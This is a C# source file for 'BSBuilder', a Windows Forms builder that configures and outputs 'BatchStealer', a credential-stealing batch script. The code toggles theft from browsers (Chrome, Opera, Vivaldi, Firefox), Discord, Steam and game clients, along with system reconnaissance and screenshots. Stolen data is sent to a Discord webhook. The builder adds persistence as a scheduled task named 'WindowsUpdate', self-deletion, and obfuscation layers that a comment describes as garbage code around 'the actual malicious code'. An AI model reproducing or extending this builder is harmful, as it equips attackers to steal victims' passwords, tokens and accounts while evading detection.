using System;
using System.Windows.Forms;
using System.Net;
using System.Text.RegularExpressions;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Drawing;

//github.com/Takaovi/BSBuilder - 2021
namespace BSBuilder
{
    public partial class MainWindow : Form
    {
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")] 
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        [DllImportAttribute("user32.dll")] 
        public static extern bool ReleaseCapture();

        Settings settings = new Settings();
        Utils utils = new Utils();
        Confuser confuser = new Confuser();
        Obfuscator obfuscator = new Obfuscator();

        public void setProperties()
        {
            acceptTOScheckbox.Checked = settings.acceptTOS;
            startadmincheckbox.Checked = settings.startadmin;
            systeminfocheckbox.Checked = settings.systeminfo;
            tasklistcheckbox.Checked = settings.tasklist;
            netusercheckbox.Checked = settings.netuser;
            qusercheckbox.Checked = settings.quser;
            cmdkeycheckbox.Checked = settings.cmdkey;
            ipconfigcheckbox.Checked = settings.ipconfig;
            screenshotcheckbox.Checked = settings.screenshot;
            chromecheckbox.Checked = settings.chrome;
            operacheckbox.Checked = settings.opera;
            vivaldicheckbox.Checked = settings.vivaldi;
            firefoxcheckbox.Checked = settings.firefox;
            osucheckbox.Checked = settings.osu;
            discordcheckbox.Checked = settings.discord;
            steamcheckbox.Checked = settings.steam;
            minecraftcheckbox.Checked = settings.minecraft;
            growtopiacheckbox.Checked = settings.growtopia;
            recurringcheckbox.Checked = settings.recurring;
            selfdeletecheckbox.Checked = settings.selfdelete;
            optimizecheckbox.Checked = settings.optimize;
            obfuscatecheckbox.Checked = settings.obfuscate;
            confusecheckbox.Checked = settings.confuse;
            certcheckbox.Checked = settings.cert;
            pushcheckbox.Checked = settings.push;
            CertLayerPicker.Value = settings.certlayers;

            webhooktextbox.Text = settings.webhook;
            reportstartmsgtextbox.Text = settings.reportstartmsg;
            reportendmsgtextbox.Text = settings.reportendmsg;
            hidepathtextbox.Text = settings.hidepath;
            screenshottoolurltextbox.Text = settings.screenshottoolurl;
            whenscheduledtextbox.Text = settings.whenscheduled;
            scheduleFrequency.Value = settings.scheduleFreq;
            schedulenametextbox.Text = settings.schedulename;
            batchcopynametextbox.Text = settings.batchcopyname;
            batchupdaternametextbox.Text = settings.batchupdatername;
            vbnametextbox.Text = settings.vbname;
            updateurltextbox.Text = settings.updateurl;
            targetusernametextbox.Text = settings.targetusername;

            batchfetchURLtextbox.Text = settings.batchfetchURL;
            batchlocationtextbox.Text = settings.batchlocation;

            ssgroupbox.Enabled = settings.screenshot;
        }

        string batch = string.Empty;
        string fetchedBatch = string.Empty;

        public MainWindow()
        {
            InitializeComponent();

            this.Size = new Size(500, 761);

            setProperties();

            fetchBatch();
        }

        void fetchBatch()
        {
            WebClient client = new WebClient();
            client.DownloadStringCompleted += (sender, e) =>
            {
                try
                {
                    batch = e.Result;
                    richtextbox.Text = batch;
                    fetchedBatch = batch;
                    fetchstatus.Text = "Batch file fetched from the URL";
                }
                catch
                {
                    if (settings.batchlocation.Length != 0)
                    {
                        batch = File.ReadAllText(Path.GetFullPath(settings.batchlocation));
                        richtextbox.Text = batch;
                        fetchedBatch = batch;
                        fetchstatus.Text = "Batch file loaded from local drive";
                    }
                    else
                    {
                        MessageBox.Show($"Failed to load batch from {settings.batchfetchURL} and no local file has been set.", "Critical error");
                    }
                }
            };

            Uri BatchURL = new Uri(settings.batchfetchURL);
            try 
            {
                client.DownloadStringAsync(BatchURL);
            }
            catch 
            {
                MessageBox.Show($"Failed to load batch from {settings.batchfetchURL}", "Critical error"); 
            }
        }

        void handleBooleanSetting(bool enabled, string gotoStr)
        {
            if (enabled)
            {
                batch = utils.removeGoto(batch, gotoStr);
            }
            else if (settings.optimize)
            {
                batch = utils.removeFunction(batch, gotoStr);
            }
        }

        void handleVariableSetting(string var, string originalVar, string originalVarName)
        {
            batch = utils.editVar(batch, originalVar, originalVarName, var);
        }

        void Build_CONFIGSECTION()
        {
            handleBooleanSetting(settings.startadmin, "skipadministrator");
            handleBooleanSetting(settings.selfdelete, "skipselfdelete");

            if (settings.reportstartmsg.Length != 0)
                batch = utils.editCurl(batch, utils.constructCurlPost("```[Report from %USERNAME% - %NetworkIP%]\\nLocal time: %HH24%:%MI%```"), settings.reportstartmsg);

            if (settings.reportendmsg.Length != 0)
                batch = utils.editCurl(batch, utils.constructCurlPost("```Batch Scheduled: %recurring%\\n[End of report]```"), settings.reportendmsg);

            if (settings.webhook.Length != 0)
                batch = utils.editVar(batch, "set \"webhook=https://discord.com/api/webhooks/\"", "webhook", settings.webhook);
        }

        void Build_INFORMATIONSECTION()
        {
            handleBooleanSetting(settings.systeminfo, "skipsysteminfocapture");
            handleBooleanSetting(settings.tasklist, "skiptasklist");
            handleBooleanSetting(settings.netuser, "skipnetuser");
            handleBooleanSetting(settings.quser, "skipquser");
            handleBooleanSetting(settings.cmdkey, "skipcmdkey");
            handleBooleanSetting(settings.ipconfig, "skipipconfig");

            if (settings.screenshot)
            {
                batch = utils.removeGoto(batch, "skipscreenshot");

                if (settings.screenshottoolurl.Length != 0)
                    batch = utils.editVar(batch, "set \"ssurl=https://github.com/chuntaro/screenshot-cmd/blob/master/screenshot.exe?raw=true\"", "ssurl", settings.screenshottoolurl);
            }
            else if (settings.optimize) 
            {
                batch = utils.removeFunction(batch, "skipscreenshot");
            }
        }

        void Build_STEALSECTION()
        {
            handleBooleanSetting(settings.chrome, "skipchrome");
            handleBooleanSetting(settings.opera, "skipopera");
            handleBooleanSetting(settings.vivaldi, "settings.vivaldi");
            handleBooleanSetting(settings.firefox, "skipfirefox");
            handleBooleanSetting(settings.osu, "skiposu");
            handleBooleanSetting(settings.discord, "skipdiscord");
            handleBooleanSetting(settings.steam, "skipsteam");
            handleBooleanSetting(settings.minecraft, "skipminecraft");
            handleBooleanSetting(settings.growtopia, "skipgrowtopia");
        }

        void Build_RECURRINGSECTION()
        {
            if (settings.optimize) 
            {
                batch = Regex.Replace(batch, @"^\s*$\n|\r", string.Empty, RegexOptions.Multiline);
            }

            if (settings.recurring)
            {
                batch = utils.removeGoto(batch, "skiprecurring");

                if (settings.scheduleFreq != 0)
                {
                    handleVariableSetting($"{settings.whenscheduled} {freq_arg} {settings.scheduleFreq}", "set \"when=Daily\"", "when");
                }
                else
                {
                    handleVariableSetting(settings.whenscheduled, "set \"when=Daily\"", "when");
                }

                handleVariableSetting(settings.hidepath, "set \"vpath=C:\\ProgramData\"", "vpath");
                handleVariableSetting(settings.schedulename, "set \"ScheduleName=WindowsUpdate\"", "ScheduleName");
                handleVariableSetting(settings.batchcopyname, "set \"bname=0.bat\"", "bname");
                handleVariableSetting(settings.batchupdatername, "set \"uname=1.bat\"", "uname");
                handleVariableSetting(settings.vbname, "set \"vname=0.vbs\"", "vname");
                handleVariableSetting(settings.updateurl, "set \"updateurl=\"", "updateurl");
                handleVariableSetting(settings.targetusername, "set \"targetusername=\"", "targetusername");
            }
            else if (settings.optimize) 
            {
                batch = utils.removeFunction(batch, "skiprecurring");
            } 
        }

        void Build_MISCSECTION()
        {
            //Obfuscate (Todo)
            if (settings.obfuscate)
            {
               batch = obfuscator.obfuscateBatch(batch, "Takaovi", 1);
            }

            //Optimize (Remove empty lines, spaces and comments)
            if (settings.optimize)
            {
                batch = utils.optimize(batch);
            }

            //Base64 (Encode)
            if (settings.cert)
            {
                batch = utils.addCert(batch, settings.certlayers);
            }

            //Push (Pushes the batch script to the side, makes it harder to read if using default text editors)
            if (settings.push)
            {
                batch = utils.pushToSide(batch);
            }

            //Confuse (Adds garbage code around the actual malicious code)
            if (settings.confuse)
            {
                batch = confuser.confuseBatch(batch);
            }
        }

        /* [MAIN BUILD FUNCTION] */
        void BuildBatchStealer()
        {
            if (batch.Length != 0) //If there's a batch file to be edited
            {
                //If user has agreed to follow the TOS
                if (settings.acceptTOS) batch = utils.removeGoto(batch, "remove_this_if_you_agree_to_follow_the_TOS");

                //Build/Edit/Remove the config section's functions
                Build_CONFIGSECTION();

                //Build/Edit/Remove the information section's functions
                Build_INFORMATIONSECTION();

                //Build/Edit/Remove the steal section's functions
                Build_STEALSECTION();

                //Build/Edit/Remove the recurring section's functions
                Build_RECURRINGSECTION();

                //Build/Edit/Remove the misc section's functions
                Build_MISCSECTION();

                if(settings.optimize) 
                    batch = utils.optimize(batch);

                //Write the BatchStealer file
                using (StreamWriter wt = new StreamWriter(AppDomain.CurrentDomain.BaseDirectory + "output.bat"))
                {
                    wt.Write(batch);
                }

                MessageBox.Show("BatchStealer built!");
                batch = fetchedBatch;
            }
            else //No batch was set
            { 
                MessageBox.Show("Could not build, missing batch script.", "Critical Error");
            }
        }

        void checkboxChangeHandler(object sender)
        {
            CheckBox checkbox = (CheckBox)sender;
            bool check = checkbox.Checked;
            string name = checkbox.Name;
            string variableName = name.Replace("checkbox", string.Empty);

            Type setting = typeof(Settings);
            setting.GetField(variableName).SetValue(settings, check);
        }

        void textboxChangeHandler(object sender)
        {
            TextBox textbox = (TextBox)sender;
            string text = textbox.Text;
            string name = textbox.Name;
            string variableName = name.Replace("textbox", string.Empty);

            Type setting = typeof(Settings);
            setting.GetField(variableName).SetValue(settings, text);
        }

        string freq_arg = "/mo";

        private void whenscheduledtextbox_SelectedIndexChanged(object sender, EventArgs e)
        {
            settings.whenscheduled = whenscheduledtextbox.Text;

            switch (settings.whenscheduled)
            {
                case "Minute":
                    freqlabel.Text = "Every (1 - 1439 minutes)";
                    scheduleFrequency.Maximum = 1439;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Hourly":
                    freqlabel.Text = "Every (1 - 23 hours)";
                    scheduleFrequency.Maximum = 23;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Daily":
                    freqlabel.Text = "Every (1 - 365 days)";
                    scheduleFrequency.Maximum = 365;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Weekly":
                    freqlabel.Text = "Every (1 - 52 weeks)";
                    scheduleFrequency.Maximum = 52;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Monthly":
                    freqlabel.Text = "1st - 12th month)";
                    scheduleFrequency.Maximum = 12;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/mo";
                    break;

                case "Onlogon":
                    freqlabel.Text = "Frequency (None)";
                    scheduleFrequency.Maximum = 0;
                    scheduleFrequency.Value = 0;
                    freq_arg = "";
                    if (!settings.startadmin) {
                        MessageBox.Show("Please enable 'Start as Administrator' before changing this to '" + whenscheduledtextbox.Text + "'. Otherwise the batch file won't be scheduled.\n\nYour batch file will not ask for administrator when started by the scheduler. It will stay hidden.", "Incorrect settings");
                        whenscheduledtextbox.Text = "Daily";
                    }
                    break;

                case "Once":
                    freqlabel.Text = "Frequency (None)";
                    scheduleFrequency.Maximum = 0;
                    scheduleFrequency.Value = 0;
                    freq_arg = "";
                    break;

                case "Onidle":
                    freqlabel.Text = "After idle (1 - 1439 minutes)";
                    scheduleFrequency.Maximum = 1439;
                    scheduleFrequency.Value = 0;
                    freq_arg = "/i";
                    break;
            }
        }

        private void openfolder_Click(object sender, EventArgs e)
        {
            Process.Start(AppDomain.CurrentDomain.BaseDirectory);
        }

        private void webhooktextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void reportstartmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void reportendmsgtextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void hidepathtextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void schedulenametextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void batchcopynametextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void batchupdaternametextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void vbnametextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void updateurltextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void targetusernametextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void fetchurl_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }

        private void scheduleFrequency_ValueChanged(object sender, EventArgs e)
        {
            settings.scheduleFreq = scheduleFrequency.Value;
        }

        private void sstooltextbox_TextChanged(object sender, EventArgs e)
        {
            textboxChangeHandler(sender);
        }


        private void acceptTOScheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (((CheckBox)sender).Checked)
            {
                settings.acceptTOS = true;
                allpanel.Enabled = true;
                panel3.Enabled = true;
            }
            else
            {
                settings.acceptTOS = false;
                allpanel.Enabled = false;
                panel3.Enabled = false;
            }
        }

        private void startadmincheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void selfdeletecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void systeminfocheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void tasklistcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void netusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void qusercheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void cmdkeycheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void chromecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void operacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void vivaldicheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void firefoxcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void osucheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void discordcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void steamcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void minecraftcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void growtopiacheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void recurringcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (((CheckBox)sender).Checked)
            {
                settings.recurring = true;
                recurringpanel.Enabled = true;
            }
            else
            {
                settings.recurring = false;
                recurringpanel.Enabled = false;
            }
        }

        private void optimizecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void obfuscatecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void ipconfigcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void confusecheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void screenshotcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (((CheckBox)sender).Checked)
            {
                settings.screenshot = true;
                ssgroupbox.Enabled = true;
            }
            else
            {
                settings.screenshot = false;
                ssgroupbox.Enabled = false;
            }
        }

        private void certcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (((CheckBox)sender).Checked)
            {
                settings.cert = true;
                settings.selfdelete = true;
                selfdeletecheckbox.Checked = true;
                if(settings.startadmin)
                {
                    settings.startadmin = false;
                    startadmincheckbox.Checked = false;
                }
            }
            else
            {
                settings.cert = false;
                settings.selfdelete = false;
                selfdeletecheckbox.Checked = false;
            }
        }

        private void pushcheckbox_CheckedChanged(object sender, EventArgs e)
        {
            checkboxChangeHandler(sender);
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void label13_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void buildbutton_Click(object sender, EventArgs e)
        {
            BuildBatchStealer();
        }

        private void searchbatchbutton_Click(object sender, EventArgs e)
        {
            OpenFileDialog file = new OpenFileDialog();
            file.InitialDirectory = AppDomain.CurrentDomain.BaseDirectory;
            file.Title = "Select the bat you want to build (Needs to be BatchStealer)";
            file.Filter = "Batch script (*.bat*)|*.bat*";
            file.RestoreDirectory = true;
            if (file.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    batch = File.ReadAllText(Path.GetFullPath(file.FileName));
                    richtextbox.Text = batch;

                    settings.batchlocation = Path.GetFullPath(file.FileName);
                    batchlocationtextbox.Text = settings.batchlocation;

                    if (batch.Length != 0) 
                    {
                        fetchstatus.Text = "Batch file loaded from local drive";
                    }
                }
                catch
                {
                    MessageBox.Show("Failed to load the batch file.", "Fail");
                }
            }
        }

        private void searchhidepathbutton_Click(object sender, EventArgs e)
        {
            using (var file = new FolderBrowserDialog())
            {
                DialogResult result = file.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(file.SelectedPath))
                {
                    if (file.SelectedPath.Contains(" "))
                    {
                        MessageBox.Show("Path(s) with spaces on them might break the batch script,\ntask scheduler might not be able to execute your file.\n\nYour path will still be set, but recurring will most likely NOT work.", "Hold on");
                        hidepathtextbox.Text = file.SelectedPath;
                    }
                    else
                    {
                        hidepathtextbox.Text = file.SelectedPath;
                    }
                }
            }
        }

        bool UI_open = false;
        private void inspectorbutton_Click(object sender, EventArgs e)
        {
            if (UI_open)
            {
                UI_open = false;
                this.Size = new Size(500, 761);
                inspectorbutton.Text = ">";

            }
            else
            {
                UI_open = true;
                this.Size = new Size(1232, 761);
                inspectorbutton.Text = "<";
            }
        }

        private void exitbutton_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void fetchbutton_Click(object sender, EventArgs e)
        {
            fetchBatch();
        }

        private void minimizebutton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            settings.saveProperties();
        }

        private void CertLayerPicker_ValueChanged(object sender, EventArgs e)
        {
            settings.certlayers = Convert.ToInt32(CertLayerPicker.Value);
        }
    }
}
